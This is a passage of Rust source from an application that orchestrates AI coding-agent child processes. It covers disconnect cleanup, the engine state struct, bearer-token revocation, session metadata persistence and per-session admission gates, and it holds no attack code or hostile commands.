    // Item-keyed open rows freeze like `current`: raw text + terminal status
    // (no sentinel pass — mirrors the anonymous slot's disconnect handling).
    // `agent_thread` (issue #99) rides along so this freeze doesn't drop the
    // sub-agent tag a cold reload would otherwise disagree with the live view on.
    let orphan_texts: Vec<(i32, String, Option<String>)> = inner
        .open_texts
        .drain()
        .map(|(_, r)| (r.row, r.buf, r.agent_thread))
        .collect();
    let turn_saw_text = inner.turn_saw_text;
    inner.turn_saw_text = false;
    let orphan_tools: Vec<(i32, serde_json::Value)> =
        inner.tool_rows.drain().map(|(_, v)| v).collect();
    // Capture EXACTLY the still-queued rows this cleanup drains (the
    // captured-ids rule every rollback path follows): a session-wide sweep
    // after the lock drops could also catch a send's row inserted meanwhile —
    // that send's Phase 3 rejects on the bumped epoch and finalizes its own row.
    let drained: Vec<i32> = inner.turn.queue.iter().filter_map(|o| o.queue_id).collect();
    inner.interrupting = false;
    inner.child = None;
    // This reset carries STOP semantics (`stopped = true` below), so nothing
    // will respawn a child until the human sends again — quite possibly never.
    // The slot and the bearer both go back with the process they belonged to.
    //
    // This is also the ONLY teardown a codex app-server death reaches: that
    // child is owned by the app-server client, never by `inner.child`, so it
    // never passes through `spawn_reader`'s EOF branches — `codex_consumer`
    // routes a genuine disconnect straight here. Without the revoke, a crashed
    // app-server whose session is never reconnected leaves its generation
    // current for the life of the process.
    release_child_slot(&mut inner);
    inner.stdin = None;
    inner.turn = TurnState::default();
    inner.clock = TurnClock::default();
    inner.current_origin_tag = None;
    inner.turn_user_row = None;
    // In-flight hidden receipt tasks outlive this STOP reset and release their
    // own tokens after the durable consume succeeds/fails; clearing them here
    // would reopen a duplicate window before that result is known.
    inner.stopped = true;
    // This reset carries STOP semantics (stopped=true, queued rows finalized), so
    // in-flight sends racing Phase 1→3 must die with it: bump the epoch, exactly
    // like stop_quiet — else a quick restart clears `stopped` and a stale queued
    // send (which ignores turn_id/busy) would enqueue or deliver a message whose
    // row this cleanup already finalized. Continuity resets (resident respawn,
    // child-EOF recovery) deliberately do NOT bump: their in-flight sends are
    // still wanted and Phase 3 promotes them onto the fresh engine.
    inner.reset_epoch += 1;
    persist_activity(db, session_id, thread_id, "stopped").await;
    let _ = app.emit(
        EVENT,
        Push::Turn {
            thread_id,
            session_id,
            state: "stopped".into(),
            queue: Vec::new(),
        },
    );
    drop(inner);
    // Real streamed output existed if item-keyed rows were open OR a standalone
    // TextDone row already landed — suppress the `*_before_output` terminal
    // insert below (same rule as the TurnEnd path), or the disconnect would
    // append a spurious terminal bubble after it.
    let had_orphan_texts = !orphan_texts.is_empty() || turn_saw_text;
    for (id, text, agent_thread) in orphan_texts {
        let _ = repo::update_lead_message(
            db,
            id,
            &text_row_content(&text, agent_thread.as_deref()),
            status,
        )
        .await;
        emit_finalize(app, thread_id, id, status);
    }
    if let Ok(Some(row)) = persist_disconnected_turn_row(
        db,
        thread_id,
        session_id,
        turn_id,
        status,
        had_busy_turn && !had_orphan_texts,
        current,
    )
    .await
    {
        match row {
            DisconnectedTurnRow::Finalized { message_id } => {
                emit_finalize(app, thread_id, message_id, status);
            }
            DisconnectedTurnRow::Inserted(message) => {
                let _ = app.emit(EVENT, Push::Message { thread_id, message });
            }
        }
    }
    finalize_orphan_tool_rows(app, db, thread_id, orphan_tools, status).await;
    if !drained.is_empty() {
        match repo::set_queued_status_by_ids(db, &drained, status).await {
            Ok(rows) => {
                for m in rows {
                    emit_finalize(app, thread_id, m.id, status);
                }
            }
            Err(e) => eprintln!("[weft] disconnect queue finalize failed: {e}"),
        }
    }
}

enum DisconnectedTurnRow {
    Finalized { message_id: i32 },
    Inserted(crate::store::entities::lead_message::Model),
}

async fn persist_disconnected_turn_row(
    db: &Db,
    thread_id: i32,
    session_id: Option<i32>,
    turn_id: i32,
    status: &str,
    had_busy_turn: bool,
    current: Option<(i32, String)>,
) -> anyhow::Result<Option<DisconnectedTurnRow>> {
    if let Some((id, text)) = current {
        let _ = repo::update_lead_message(
            db,
            id,
            &serde_json::json!({ "text": text }).to_string(),
            status,
        )
        .await;
        return Ok(Some(DisconnectedTurnRow::Finalized { message_id: id }));
    }
    if had_busy_turn {
        if let Some(message) =
            insert_terminal_assistant_if_missing(db, thread_id, session_id, turn_id, status).await?
        {
            return Ok(Some(DisconnectedTurnRow::Inserted(message)));
        }
    }
    Ok(None)
}

/// Per-turn receipt/OCC metadata. Time is recorded only for read-only test-plan
/// OCC and never drives status, interruption, reset, or stop decisions.
pub struct TurnClock {
    /// Unix-MILLISECONDS stamp of the in-flight turn's start (0 = never
    /// begun). Same clock as `test_plan.updated_at`, so "did the user save
    /// mid-turn?" is a plain comparison — millisecond resolution keeps an
    /// idle-save immediately followed by the feedback turn (same second)
    /// from being misread as a mid-turn save.
    pub started_millis: u64,
    /// True once SOME activity has been observed for the in-flight turn.
    /// Gates the one-time "consumed" receipt (issue #94, [`note_turn_activity`])
    /// so repeated stdout lines / delta events within one turn don't re-query
    /// the DB after the first — `mark_message_consumed` is idempotent on its
    /// own, this just avoids the redundant round-trips.
    consumed_marked: bool,
}

impl Default for TurnClock {
    fn default() -> Self {
        Self {
            started_millis: 0,
            consumed_marked: false,
        }
    }
}

impl TurnClock {
    pub(crate) fn begin_turn(&mut self) {
        self.started_millis = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or_default();
        self.consumed_marked = false;
    }
    /// Re-sync with the queue state after a turn ends (queued pop = new turn).
    fn on_turn_end(&mut self, still_busy: bool) {
        if still_busy {
            self.begin_turn();
        }
    }
    /// True only the FIRST call since the turn began (`begin_turn`) — the
    /// caller uses this to fire the one-time "consumed" mark. Pure state flip,
    /// no I/O: [`note_turn_activity`] is what actually persists/pushes it.
    fn mark_consumed_once(&mut self) -> bool {
        if self.consumed_marked {
            false
        } else {
            self.consumed_marked = true;
            true
        }
    }
    /// Un-burn the one-shot gate: the attempted mark turned out to be
    /// `NotEligible` (transient — e.g. a queued row not yet flipped to
    /// "complete"), not a settled outcome, so the NEXT activity event should
    /// retry rather than silently giving up on this turn's receipt forever
    /// (PR #117 review, P2).
    fn rearm_consumed_gate(&mut self) {
        self.consumed_marked = false;
    }
}

/// One app-server item-keyed streaming text row's live state (issue #99 adds
/// `agent_thread` to the pre-existing (row id, buf, last-flush) tuple). Only
/// `open_texts` uses this — the anonymous `current` slot (exec/claude/opencode,
/// and app-server's own item-less events) never attributes to a sub-agent, so
/// it keeps its plain tuple type unchanged.
pub struct OpenTextRow {
    pub row: i32,
    pub buf: String,
    pub last_flush: std::time::Instant,
    /// The sub-agent thread this row belongs to, already normalized against the
    /// session's own thread id (`branch_of`) — None = mainline. Re-embedded into
    /// the row's persisted content on EVERY rewrite (streaming throttle tick,
    /// finalize, disconnect cleanup, hard stop) so a cold reload groups it
    /// identically to the live view — see `text_row_content`.
    pub agent_thread: Option<String>,
}

/// Normalizes a raw wire `agent_thread` (whatever `threadId` the event arrived
/// on — see `codex_app_server::notification_to_event`) against this session's
/// OWN thread id into a grouping-ready value: `None` for the session's own
/// mainline activity (including every non-app-server dialect, which never sets
/// a raw thread at all), `Some(id)` for a genuine sub-agent's row. This is the
/// ONE place "is this row foreign" is decided (issue #99) — everything
/// downstream (row content, tool rows) just carries whatever this returns.
fn branch_of(raw: Option<String>, own_thread: &str) -> Option<String> {
    raw.filter(|t| t != own_thread)
}

/// Build a `kind:"text"` row's persisted content, `agentThread` included only
/// when this row belongs to a sub-agent (issue #99) — an untagged row is
/// byte-identical to pre-#99 output. Centralizing this is what lets the tag
/// survive every rewrite of a row's content (throttled streaming update,
/// finalize, disconnect cleanup, hard stop all funnel through it) instead of
/// only its first insert, which would desync the live view from a cold reload.
fn text_row_content(text: &str, agent_thread: Option<&str>) -> String {
    match agent_thread {
        Some(t) => serde_json::json!({ "text": text, "agentThread": t }).to_string(),
        None => serde_json::json!({ "text": text }).to_string(),
    }
}

pub struct EngineInner {
    pub thread_id: i32,
    /// claude | codex | opencode — selects the wire dialect + process model.
    pub tool: String,
    /// Per-session command pin (from thread.lead_command / session.command).
    /// None = resolve the spawn binary from the global tool→command override map;
    /// Some = this session was frozen to a specific command (alias opt-out).
    pub command: Option<String>,
    /// Chat-mode worker session; None for the lead.
    pub session_id: Option<i32>,
    pub cwd: std::path::PathBuf,
    /// Ask-hook + MCP injection args, appended to every spawn.
    pub extra_args: Vec<String>,
    /// Environment variables set on every spawned tool child alongside
    /// `extra_args`. Two producers today: the codex computer-use bearer
    /// (the bearer must ride the child's
    /// environment, owner-only readable, instead of `-c` argv which is
    /// world-readable via process listings), and OpenCode's session-scoped
    /// inline MCP config (OPENCODE_CONFIG_CONTENT — keeping it on the engine
    /// prevents two sessions sharing one worktree from overwriting each
    /// other's bus URL). See `bus::inject::Injection::env`.
    pub extra_env: Vec<(String, String)>,
    /// The computer-use injection, held SEPARATELY from `extra_args`/
    /// `extra_env` rather than flattened into them at construction — see
    /// [`refresh_computer_injection`] for why it has to be replaceable.
    ///
    /// Both halves of one `bus::inject::Injection`: `computer_args` are argv
    /// entries (claude's `--mcp-config <file>`, codex's two `-c
    /// mcp_servers.weft_computer.*` flags) and `computer_env` the child-env
    /// ones (codex's bearer, opencode's inline config). Empty for engines
    /// that must never receive computer use at all — concierge and curator
    /// leads — and that emptiness is exactly what
    /// [`refresh_computer_injection`] keys on to avoid ever GRANTING the
    /// tool to an engine that was constructed without it.
    ///
    /// Assembled onto a spawn by [`build_args`] and [`spawn_env`]; never
    /// read directly at a spawn site, so a future spawn path can't silently
    /// omit (or double-apply) it.
    pub computer_args: Vec<String>,
    /// The env half of the computer injection — see [`Self::computer_args`].
    pub computer_env: Vec<(String, String)>,
    /// The bearer generation this engine's live computer injection was minted
    /// at — its OWNERSHIP STAMP over a shared identity. `None` before the first
    /// mint, and after a teardown consumed it.
    ///
    /// Required because `(thread_id, ask_dir, worktree_id)` is not unique to an
    /// engine: for a worker it is `(thread, direction, worktree)`, and a second
    /// session opened on the same direction and worktree shares it. So the
    /// identity's generation can be rotated out from under this engine by
    /// somebody else's injection while this engine's child is still winding
    /// down. Revoking the identity's CURRENT generation at that point would
    /// kill the replacement's live bearer and 401 a healthy session; no local
    /// counter can detect it, since `generation`/`turn_id` are per-engine and
    /// agree that this engine's own teardown is legitimate.
    ///
    /// [`revoke_engine_bearer`] compares this stamp against the identity's
    /// current generation and revokes only on a match — see
    /// `computer_srv::revoke_computer_session_token_generation`.
    ///
    /// Set for ALL FOUR engine shapes. Three receive it through
    /// `Injection::computer_generation` in [`refresh_computer_injection`]; ACP,
    /// whose bearer never travels through an `Injection` at all, receives it
    /// from `bus::inject::AcpMcpInjection` at session establishment.
    pub computer_gen: Option<u64>,
    pub system_prompt: String,
    pub native_id: Option<String>,
    /// A mechanical digest of the thread's history, staged by an engine/model
    /// switch (issue #96, pitfall 2: "new engine can't see thread history") to
    /// ride the NEXT outgoing turn's dispatched text. `send()` PEEKS this (never
    /// `.take()`s it) to build that turn's dispatched text, and clears it only
    /// once delivery is confirmed (queued, written to a live stdin, or handed
    /// to a spawn) — a transient failure on the first attempt after a switch
    /// leaves it in place for the retry, rather than discarding it permanently
    /// (adversarial re-review of PR #139, P1: an earlier version used `.take()`
    /// up front, before any of `send()`'s many failure paths had run). `None`
    /// in the common case (no switch pending). Deliberately NOT persisted to
    /// the DB, and NEVER written into `lead_message.content` either (`send()`
    /// builds the row's persisted `content`/`dispatched` fields from the
    /// digest-free text FIRST, and only prepends this digest to the outbound
    /// copy as the very last step) — an app restart between a switch and the
    /// next send already lost nothing durable (the switch already cleared
    /// native_id in the DB, so the fresh engine starts a brand-new native
    /// session either way); only this one best-effort context nudge would be
    /// skipped, not any correctness guarantee, and definitely not something
    /// that should ever land at rest in the database (issue #96 pitfall 2's
    /// digest can carry up to 12 prior turns of raw conversation text).
    pub pending_context_digest: Option<String>,
    pub slash_commands: Vec<super::proto::SlashCmd>,
    pub turn: TurnState,
    pub turn_id: i32,
    /// Ask-bridge identity: a direction id for workers, "lead" for the lead.
    pub ask_dir: String,
    /// Receipt/OCC metadata for the in-flight turn.
    pub clock: TurnClock,
    pub child: Option<Child>,
    /// Registration for `child`. T1 sets this Some at every spawn
    /// (`ensure_running_locked` / per-turn). **T2 precondition:** T2 must mirror it at
    /// every teardown/clear site (invalidate_resident / stop_quiet / the `child = None`
    /// resets) — take BOTH `child` and `child_reg` and route through
    /// `proc_registry::reap(&mut child, &reg)` for tree-aware reclaim — so the pair
    /// stays both-Some/both-None. Until T2 does, a cleared `child` leaves this Some
    /// (a stale dead-pid entry) only until the next spawn overwrites it; that is
    /// harmless today (nothing consumes `is_ours`/`count` yet), and the registry's
    /// id-keyed deregister makes even a pid-reuse across that window safe. Dropping it
    /// only deregisters (never reclaims).
    pub child_reg: Option<crate::proc_registry::Registration>,
    /// Active-session slot permit for `child` (paired with `child_reg`). Set at
    /// every spawn right after registration; dropped at EVERY site that clears
    /// or replaces `child`, which releases the slot so a queued session can
    /// proceed. Those sites, exhaustively: the respawn overwrite
    /// (`ensure_running_locked` / `spawn_turn`), `invalidate_resident`,
    /// `stop_quiet`, `cleanup_disconnected_turn`, `reset_failed_hidden_turn`,
    /// `reset_ignored_cancel_turn`, and BOTH of `spawn_reader`'s EOF branches
    /// (per-turn exit and resident death). Miss one and the slot leaks for the
    /// rest of the process: the gate is a `OnceLock` singleton, so a session
    /// that was stopped hours ago keeps counting against the ceiling until the
    /// app restarts — see `stop_quiet_releases_the_session_gate_slot`.
    ///
    /// Every entry in that list EXCEPT the two respawn overwrites goes through
    /// [`release_child_slot`], which drops the permit and revokes the child's
    /// computer-use bearer together. The list above is the reason: bearer
    /// revocation needs the identical enumeration, and maintaining it twice
    /// guarantees drift. The respawn overwrites are the deliberate exception —
    /// they re-mint in the same critical section, which rotates the generation
    /// on its own. See that helper's doc before adding a teardown site here.
    ///
    /// The pairing is directional both ways: a respawn must also release the
    /// DEAD child's permit *before* queuing for a new one, or a saturated gate
    /// leaves the session waiting on a slot it is itself still holding.
    ///
    /// `None` = ungated (session_gate degraded / no permit was available).
    /// See [`crate::session_gate`].
    pub child_permit: Option<tokio::sync::OwnedSemaphorePermit>,
    pub stdin: Option<ChildStdin>,
    /// Streaming assistant row being built: (row id, accumulated text, last DB flush).
    /// exec/claude 的单串行匿名槽;app-server 的 item 键控行走 `open_texts`。
    pub current: Option<(i32, String, std::time::Instant)>,
    /// app-server 并行流式 item → 其开放文本行。镜像 `tool_rows` 的按 item 分键
    /// 模式:主叙述与各 collab 子 agent 的 agentMessage 各自成行,工具行不再切断
    /// 文本,item/completed 以权威全文定稿。`agent_thread`(issue #99)与行同寿命,
    /// 每次内容重建(节流更新/finalize/disconnect/hard stop)都要带上它,否则冷
    /// 加载会读到丢了标记的最终内容——见 `OpenTextRow` 文档。
    pub open_texts: std::collections::HashMap<String, OpenTextRow>,
    /// 本轮已落过「即插即定稿」的独立文本行(standalone TextDone:/plan 内容、
    /// 未流式的 agentMessage)。这类行不经过 current/open_texts,turn 失败时
    /// 终态插入要靠它抑制,否则真实输出之后还会追加 *_before_output 气泡。
    /// TurnEnd/disconnect 清理后复位。
    pub turn_saw_text: bool,
    /// Set while a protocol interrupt is in flight so the closing row/status
    /// reads `interrupted` instead of `error`.
    pub interrupting: bool,
    /// Bumped per spawn; stale reader tasks compare and exit.
    pub generation: u64,
    /// Bumped whenever a stop/reset clears the turn (stop_quiet). A send captures
    /// this at Phase 1; if it advances before the send commits, the send was
    /// invalidated by a stop — even one immediately followed by a restart, which
    /// resets `stopped`/`busy` and so slips past those flags — and must not
    /// deliver onto the fresh turn.
    pub reset_epoch: u64,
    /// Set on idle when skills changed; the next send silently restarts the
    /// resident process so it picks up newly-injected skills. UI never sees it.
    pub pending_skill_refresh: bool,
    /// Set when the tool's command override (alias) changed under this live
    /// engine; the next send silently bounces the resident process / codex client
    /// so it respawns from the new command. Like `pending_skill_refresh`, invisible
    /// to the UI.
    pub pending_command_refresh: bool,
    /// 会话信息面板的最近快照,供 lead_state / session_for 重挂回填(claude:init
    /// 解析出 mcp/model/window,turn 结束更新 context_tokens)。
    pub last_context_tokens: Option<u64>,
    pub last_model: Option<String>,
    /// Reasoning effort / thinking level from ACP configOptions or updates.
    pub last_reasoning: Option<String>,
    pub last_window: Option<u64>,
    pub last_mcp_servers: Vec<super::proto::McpServer>,
    pub last_tools: Vec<String>,
    /// Out-of-band probe ordering: `probe_seq` hands a ticket to each probe as
    /// it STARTS (`lead_session_meta` / `session_meta` take one before
    /// gathering); `probe_committed` records the newest absorbed ticket. A
    /// result bearing an older ticket lost the race — its usage was read
    /// before a newer probe's and may only fill holes, never overwrite.
    pub probe_seq: u64,
    pub probe_committed: u64,
    /// Opaque tag of the turn whose output is currently being emitted. Set at
    /// every turn-start (including None turns) so a prior concierge reply target
    /// never leaks into a later non-IM turn. Stamped onto each emitted frame.
    pub current_origin_tag: Option<String>,
    /// Maps an in-flight tool call's id (claude `tool_use_id` / codex item id) to
    /// its persisted `kind:"tool"` row id and content JSON, so the out-of-band
    /// result merges its output without re-reading the row. Cleared per turn.
    pub tool_rows: std::collections::HashMap<String, (i32, serde_json::Value)>,
    /// this session's most recent completed
    /// tool-result rows that currently carry inline screenshot data URIs in
    /// their persisted `content.images` — oldest first, `(row_id, is_error,
    /// content)`. Capped at `MAX_INLINE_IMAGE_ROWS` by `merge_tool_results`,
    /// which evicts the OLDEST entry's inline images (stripping `images`
    /// from THAT row's own already-persisted content, keeping its `output`
    /// text — the screenshot's file path — untouched) the moment a NEW
    /// image-bearing row would push this past the cap. In-memory only,
    /// scoped to THIS engine's own lifetime — see `merge_tool_results`'s own
    /// doc for why that is an accepted, disclosed limitation rather than a
    /// durable migration. Never cleared per-turn (unlike `tool_rows`): the
    /// retention window spans the whole session, not one turn.
    pub inline_image_rows: std::collections::VecDeque<(i32, bool, serde_json::Value)>,
    /// Explicit user/guard stop. Hidden plumbing must not resurrect stopped
    /// engines; explicit sends/ensure clear this and restart as needed.
    pub stopped: bool,
    /// Per-session `codex app-server` connection (app-server transport only),
    /// spawned lazily on the first turn with this session's `-c mcp_servers` args.
    pub codex_client: Option<crate::codex_app_server::Client>,
    /// Per-session ACP runtime handle (omp and future ACP backends). The
    /// underlying child is process-global per backend; this Option means "this
    /// engine has subscribed at least one session on that client".
    pub acp_client: Option<crate::acp::runtime::ClientHandle>,
    /// In-flight AskRegistry ids for ACP `session/request_permission` cards.
    /// Cancelled on hard stop so a late Always/Full cannot grant after takeover.
    pub acp_pending_asks: Vec<u64>,
    /// Rewind anchor bookkeeping for the in-flight turn: the user row that
    /// opened it. Written with the turn's native anchor at a clean TurnEnd
    /// (claude: `last_assistant_uuid`; codex app-server: the turn id).
    pub turn_user_row: Option<i32>,
    /// Hidden delivery ids whose first activity has been observed and whose
    /// durable consume transaction is still in flight. This is deliberately
    /// independent of `turn_user_row`: TurnEnd/EOF can retarget that marker to
    /// another queued turn while the receipt task waits on the admission gate.
    /// Visible admission treats every id here as already represented, avoiding
    /// a duplicate pending row; the task removes it after success or failure.
    pub hidden_receipt_inflight: Arc<DashSet<i32>>,
    /// Last assistant-event uuid seen in the in-flight turn (claude only —
    /// other dialects report no transcript uuid).
    pub last_assistant_uuid: Option<String>,
    /// A conversation/code rewind is in flight. Set under the same lock as
    /// rewind's busy check, so a send either lands first (busy → rewind
    /// refuses) or loses to the reservation and errors out — closing the
    /// window where a concurrent send's turn would be silently interrupted
    /// and its rows deleted by the rewind's stop/truncate steps.
    pub rewinding: bool,
    /// Set only for the tiny final handoff of an opt-in quota fail-over. A
    /// send that wins before this flag is set keeps the existing engine; once
    /// set, new sends fail visibly rather than starting a healthy turn that
    /// the imminent switch would interrupt.
    pub quota_failover_committing: bool,
    /// Set only for the window in which [`stop_quiet`] has released the engine
    /// lock to await ACP cancel/unsubscribe. See `send_reservation_valid`.
    pub tearing_down: bool,
    /// The worktree this worker runs in (None for the lead console): lets
    /// send's admission honor a worktree-level restore reservation without a
    /// DB lookup. Sibling sessions of one worktree share the same id.
    pub worktree_id: Option<i32>,
}

pub type EngineRef = Arc<tokio::sync::Mutex<EngineInner>>;

/// Engine meta snapshot persisted across app restarts (thread.lead_meta /
/// session.meta). Written at init/turn-end, read back on engine (re)creation,
/// so the Session panel shows the last-known context/model/MCP state instead of
/// blanking until the next turn's events.
#[derive(Default, serde::Serialize, serde::Deserialize)]
pub struct PersistedMeta {
    pub context_tokens: Option<u64>,
    pub window: Option<u64>,
    pub model: Option<String>,
    #[serde(default)]
    pub reasoning_effort: Option<String>,
    #[serde(default)]
    pub mcp_servers: Vec<super::proto::McpServer>,
    #[serde(default)]
    pub tools: Vec<String>,
}

/// Whether a transport's live event stream reports context usage itself.
/// claude (`result.usage`) and codex (TokenCount / turn-end usage) do — for
/// them a probe's tokens only fill a hole, since a probe started mid-turn can
/// carry the PREVIOUS turn's usage and land after the turn-end checkpoint.
/// opencode has no usage-bearing event (turns end on EOF); its sidecar probe
/// is the ONLY usage source, so probe tokens must stay updatable or the count
/// freezes at the first probed value forever.
fn usage_events_authoritative(tool: &str) -> bool {
    tool != "opencode"
}

impl PersistedMeta {
    /// Merge an out-of-band probe snapshot (`session_meta::gather`). `None`
    /// fields keep existing values — a transient probe failure must never
    /// blank anything. Returns whether anything changed.
    ///
    /// `freshest` — this result carries the newest probe ticket (or ran with
    /// no engine, hence no race): only then may it OVERWRITE. A stale result
    /// (older ticket, or ticketless while an engine is now live) read state
    /// before a newer probe did, so every field degrades to fill-a-hole.
    /// `usage_from_events` further gates `context_tokens` (see
    /// [`usage_events_authoritative`]): claude/codex usage is owned by the
    /// event stream, so probes only ever fill its holes.
    fn merge_probe(
        &mut self,
        snap: &crate::session_meta::SessionMetaSnapshot,
        freshest: bool,
        usage_from_events: bool,
    ) -> bool {
        let mut changed = false;
        if let Some(v) = &snap.model {
            let accept = if freshest {
                self.model.as_deref() != Some(v)
            } else {
                self.model.is_none()
            };
            if accept {
                self.model = Some(v.clone());
                changed = true;
            }
        }
        if let Some(v) = snap.window {
            let accept = if freshest {
                self.window != Some(v)
            } else {
                self.window.is_none()
            };
            if accept {
                self.window = Some(v);
                changed = true;
            }
        }
        if let Some(v) = snap.context_tokens {
            let updatable = freshest && !usage_from_events;
            let accept = if updatable {
                self.context_tokens != Some(v)
            } else {
                self.context_tokens.is_none()
            };
            if accept {
                self.context_tokens = Some(v);
                changed = true;
            }
        }
        if let Some(v) = &snap.mcp_servers {
            // Only the freshest result may touch MCP at all. An empty list is
            // indistinguishable from "user just removed every server" (an
            // authoritative empty result from a newer probe), so a stale
            // result must not even fill it — resurrection is worse than one
            // probe-cycle of latency on a cold start (whose first probe is
            // freshest anyway).
            if freshest && self.mcp_servers != *v {
                self.mcp_servers = v.clone();
                changed = true;
            }
        }
        changed
    }
}

/// Snapshot the engine's last-known meta and persist it. Awaited inline (like
/// every other DB write on the event loop) rather than spawned: an Init write
/// racing a TurnEnd write from independent tasks could land last and revert the
/// snapshot to pre-turn values. A single-column UPDATE of a few hundred bytes —
/// the await is negligible. Failures only log; the snapshot is best-effort.
async fn persist_engine_meta(db: &Db, inner: &EngineInner) {
    let snap = PersistedMeta {
        context_tokens: inner.last_context_tokens,
        window: inner.last_window,
        model: inner.last_model.clone(),
        reasoning_effort: inner.last_reasoning.clone(),
        mcp_servers: inner.last_mcp_servers.clone(),
        tools: inner.last_tools.clone(),
    };
    let json = match serde_json::to_string(&snap) {
        Ok(json) => json,
        Err(e) => {
            eprintln!("[weft] engine meta serialize failed: {e}");
            return;
        }
    };
    let r = match inner.session_id {
        Some(sid) => repo::save_session_meta(db, sid, &json).await,
        None => repo::save_lead_meta(db, inner.thread_id, &json).await,
    };
    if let Err(e) = r {
        eprintln!("[weft] engine meta persist failed: {e}");
    }
}

/// Fold an out-of-band probe snapshot (`session_meta` / `lead_session_meta`)
/// into the engine's cached meta — and into the persisted snapshot, so it
/// survives a relaunch. codex/opencode model/window/MCP only exist via these
/// probes, never via engine events; without this the turn-end snapshot writes
/// `model: null` + empty MCP for those transports and a relaunch shows a blank
/// panel until the next probe (or forever if it keeps failing). Works with or
/// without a live engine: on a fresh relaunch the panel probes before any
/// engine is spawned, so the no-engine path merges straight into the stored JSON.
/// Hand out a probe ticket for the live engine (if any) at probe START.
/// `absorb_probe_meta` later compares the ticket against the newest committed
/// one, so a slow probe that returns after a fresher one can't roll usage back.
/// No engine → None: nothing is running, so there is no race to order.
pub async fn take_probe_ticket(
    app: &AppHandle,
    thread_id: i32,
    session_id: Option<i32>,
) -> Option<u64> {
    let key = match session_id {
        Some(sid) => sid as i64,
        None => -(thread_id as i64),
    };
    let eng = app.state::<LeadChatState>().get(key)?;
    let mut inner = eng.lock().await;
    inner.probe_seq += 1;
    Some(inner.probe_seq)
}

pub async fn absorb_probe_meta(
    app: &AppHandle,
    db: &Db,
    thread_id: i32,
    session_id: Option<i32>,
    ticket: Option<u64>,
    snap: &crate::session_meta::SessionMetaSnapshot,
) {
    let key = match session_id {
        Some(sid) => sid as i64,
        None => -(thread_id as i64),
    };
    if let Some(eng) = app.state::<LeadChatState>().get(key) {
        let mut inner = eng.lock().await;
        // Freshest = carries the newest ticket. A ticketless result on a LIVE
        // engine started before the engine existed — it has no ordering claim
        // against probes ticketed since, so it degrades to fill-only too.
        let freshest = ticket.is_some_and(|t| t > inner.probe_committed);
        if let Some(t) = ticket {
            inner.probe_committed = inner.probe_committed.max(t);
        }
        let mut m = PersistedMeta {
            context_tokens: inner.last_context_tokens,
            window: inner.last_window,
            model: inner.last_model.clone(),
            reasoning_effort: inner.last_reasoning.clone(),
            mcp_servers: inner.last_mcp_servers.clone(),
            tools: inner.last_tools.clone(),
        };
        if m.merge_probe(snap, freshest, usage_events_authoritative(&inner.tool)) {
            inner.last_context_tokens = m.context_tokens;
            inner.last_window = m.window;
            inner.last_model = m.model.clone();
            if m.reasoning_effort.is_some() {
                inner.last_reasoning = m.reasoning_effort.clone();
            }
            inner.last_mcp_servers = m.mcp_servers.clone();
            persist_engine_meta(db, &inner).await;
        }
        return;
    }
    // No live engine (e.g. right after a relaunch): merge into the stored JSON.
    // No ticket ordering needed — with no engine there is no turn running and
    // the probes were issued against the same resting state.
    let (existing, tool) = match session_id {
        Some(sid) => match repo::get_session(db, sid).await.ok().flatten() {
            Some(s) => (Some(s.meta), s.tool),
            None => (None, String::new()),
        },
        None => match repo::get_thread(db, thread_id).await.ok().flatten() {
            Some(t) => (Some(t.lead_meta), t.lead_tool),
            None => (None, String::new()),
        },
    };
    let mut m: PersistedMeta = existing
        .as_deref()
        .filter(|s| !s.is_empty())
        .and_then(|s| serde_json::from_str(s).ok())
        .unwrap_or_default();
    // Engine-less all the way through: nothing ran concurrently, so this
    // result IS the freshest view of the resting session.
    if !m.merge_probe(snap, true, usage_events_authoritative(&tool)) {
        return;
    }
    let Ok(json) = serde_json::to_string(&m) else {
        return;
    };
    let r = match session_id {
        Some(sid) => repo::save_session_meta(db, sid, &json).await,
        None => repo::save_lead_meta(db, thread_id, &json).await,
    };
    if let Err(e) = r {
        eprintln!("[weft] probe meta persist failed: {e}");
    }
}

/// Restore a persisted meta snapshot into a freshly built engine (the inverse of
/// [`persist_engine_meta`]). Empty/corrupt JSON is a silent no-op — the panel
/// just waits for the next turn like before.
pub fn apply_persisted_meta(inner: &mut EngineInner, json: &str) {
    if json.is_empty() {
        return;
    }
    let Ok(m) = serde_json::from_str::<PersistedMeta>(json) else {
        return;
    };
    inner.last_context_tokens = m.context_tokens;
    inner.last_window = m.window;
    inner.last_model = m.model;
    inner.last_reasoning = m.reasoning_effort;
    inner.last_mcp_servers = m.mcp_servers;
    inner.last_tools = m.tools;
}

/// One serial admission gate per lead thread / worker session. This is kept
/// outside [`EngineInner`] so constructors, engine replacement, and durable
/// journal enqueue all converge on the same gate even when no engine is
/// resident yet. The normal order is surface gate -> global engine-admission
/// read. A destructive path that already owns the global write fence must use
/// an admitted stop core and never reacquire a surface gate.
static ENGINE_ADMISSION_GATES:
    std::sync::OnceLock<DashMap<i64, std::sync::Weak<tokio::sync::Mutex<()>>>> =
    std::sync::OnceLock::new();

/// Per-surface hidden receipt reservations live outside [`EngineInner`] so an
/// engine replacement cannot race an old receipt task waiting on the admission
/// gate. The values are weak: once the old/new engine and all receipt tasks drop
/// the shared set, the historical key is reclaimed on a later lookup.
static ENGINE_HIDDEN_RECEIPTS: std::sync::OnceLock<DashMap<i64, std::sync::Weak<DashSet<i32>>>> =
    std::sync::OnceLock::new();

pub(crate) fn admission_gate_for_key(key: i64) -> Arc<tokio::sync::Mutex<()>> {
    let gates = ENGINE_ADMISSION_GATES.get_or_init(DashMap::new);
    // Weak values let an engine/session release its gate, but the map still
    // needs opportunistic pruning so a long-lived app does not retain every
    // historical thread key forever. An entry whose gate is still held by an
    // admission guard upgrades successfully and is therefore preserved.
    let stale_keys = gates
        .iter()
        .filter_map(|entry| entry.value().upgrade().is_none().then_some(*entry.key()))
        .collect::<Vec<_>>();
    for stale_key in stale_keys {
        // `remove_if` rechecks the Weak under the shard lock. A concurrent
        // caller may have replaced the dead entry with a live gate after the
        // scan; never remove that replacement, or the next caller could mint a
        // second mutex for the same key while the first guard is still held.
        let _ = gates.remove_if(&stale_key, |_key, weak| weak.upgrade().is_none());
    }
    match gates.entry(key) {
        dashmap::mapref::entry::Entry::Occupied(mut entry) => {
            if let Some(gate) = entry.get().upgrade() {
                return gate;
            }
            let gate = Arc::new(tokio::sync::Mutex::new(()));
            entry.insert(Arc::downgrade(&gate));
            gate
        }
        dashmap::mapref::entry::Entry::Vacant(entry) => {
            let gate = Arc::new(tokio::sync::Mutex::new(()));
            entry.insert(Arc::downgrade(&gate));
